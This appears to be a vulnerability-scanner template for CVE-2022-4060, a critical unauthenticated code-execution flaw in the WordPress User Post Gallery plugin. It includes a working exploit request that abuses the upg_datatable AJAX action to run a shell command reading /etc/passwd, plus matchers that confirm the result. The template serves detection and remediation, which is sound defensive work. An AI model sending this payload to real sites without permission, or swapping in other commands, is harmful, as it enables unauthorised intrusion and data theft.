http:
- matchers:
  - part: header
    type: word
    words:
    - application/json
  - part: body
    type: word
    words:
    - recordsFiltered
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:head+-1+/etc/passwd:NULL:NULL'
id: CVE-2022-4060
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:odude:user_post_gallery:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-4060
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-94
    epss-percentile: 0.8921
    epss-score: 0.02591
  description: 'WordPress User Post Gallery plugin through 2.19 is susceptible to
    remote code execution. The plugin does not limit which callback functions can
    be called by users, making it possible for an attacker execute malware, obtain
    sensitive information, modify data, and/or gain full control over a compromised
    system without entering necessary credentials.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected WordPress site.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: user_post_gallery
    vendor: odude
    verified: true
  name: WordPress User Post Gallery <=2.19 - Remote Code Execution
  reference:
  - https://wpscan.com/vulnerability/8f982ebd-6fc5-452d-8280-42e027d01b1e
  - https://wordpress.org/plugins/wp-upg/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-4060
  - https://github.com/im-hanzou/UPGer
  - https://github.com/nomi-sec/PoC-in-GitHub
  remediation: 'Update to the latest version of the User Post Gallery plugin (>=2.20)
    to mitigate this vulnerability.

    '
  severity: critical
  tags: cve,cve2022,unauth,wpscan,rce,wordpress,wp-plugin,wp,wp-upg,odude
